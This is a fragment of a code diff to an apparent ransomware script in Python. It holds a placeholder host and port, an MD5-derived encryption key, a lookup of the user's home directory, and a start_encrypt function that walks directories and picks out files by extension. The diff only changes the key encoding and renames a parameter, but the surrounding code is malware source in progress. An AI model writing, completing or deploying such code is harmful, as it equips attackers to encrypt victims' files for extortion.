@@ -224,6 +224,7 @@ host = '<host>'
 port = <port>
 
 key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
+key = key.encode('utf-8')
 
 global platform
 platform = platform.system()
@@ -252,9 +253,9 @@ def get_target():
     else:
         sys.exit(1) # Cannot find users home directory, skip MacOS.
 
-def start_encrypt(target, key):
+def start_encrypt(p, key):
     try:
-        for path, subdirs, files in os.walk(target):
+        for path, subdirs, files in os.walk(p):
             for name in files:
                 for i in ext:
                     if name.endswith(i.lower()):
